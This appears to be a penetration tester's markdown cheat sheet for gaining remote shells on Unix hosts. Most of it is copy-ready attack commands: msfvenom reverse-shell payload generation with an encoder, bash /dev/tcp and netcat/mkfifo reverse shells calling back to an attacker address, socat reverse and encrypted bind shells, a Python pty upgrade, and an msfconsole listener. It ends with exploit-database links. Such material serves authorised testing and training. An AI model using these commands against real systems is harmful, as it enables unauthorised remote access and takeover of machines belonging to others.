# Unix Remote Code Execution

## msfvenom

Shell File

``` bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Java Code

``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

Shell Code

``` bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread  -f c â€“e x86/shikata_ga_nai -b "<badchars>"
```

Encoders

``` bash
msfvenom  --list encoders
```

## Bash Reverse Shell

> Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

``` bash
/bin/sh -c 'sh -i >& /dev/tcp/myip/443 0>&1'
```

``` bash
/bin/sh -c '0<&60-;exec 60<>/dev/tcp/myip/443;sh <&60 >&60 2>&60'
```

## Netcat Reverse Shell

Kali machine

``` bash
sudo nc -nlvp 443
```

Unix machine

``` bash
nc -nv 192.168.11.130 443 -e /bin/sh
```

> Netcat OpenBsd

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f
```

> Netcat BusyBox

```
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f
```

## Socat Reverse Shell

Kali machine

``` bash
socat -d -d TCP4-LISTEN:443 STDOUT
```

Unix machine

``` bash
socat TCP4:192.168.11.130:443 EXEC:/bin/sh
```

## Socat Encrypted Bind Shell

Create credential

``` bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Unix machine

``` bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/sh
```

Kali machine

``` bash
sudo socat OPENSSL:192.168.11.130:443,verify=0
```

## Nmap NSE Scripts Exploit

``` bash
cd /usr/share/nmap/scripts
grep Exploits *.nse
nmap --script-help=clamav-exec.nse
```

## Upgrade shell

``` bash
/usr/bin/python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

^Z

``` bash
stty raw -echo; fg
```

``` bash
stty -a
```

``` bash
stty rows 41 columns 172
```

## msfconsole multi handler

``` bash
sudo msfconsole -x "use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit"
```

``` bash
processing AutoRunScript 'post/windows/manage/migrate'
```

## <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">PayloadsAllTheThings</a>

## Exploit Resources

=== "Online"

	[Exploit Database]( https://www.exploit-db.com)

	[SecurityFocus]( https://www.securityfocus.com)

	[Packet Storm](https://packetstormsecurity.com)

	[Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

=== "Offline"

	SearchSploit

	Metasploit Framework

	BeEF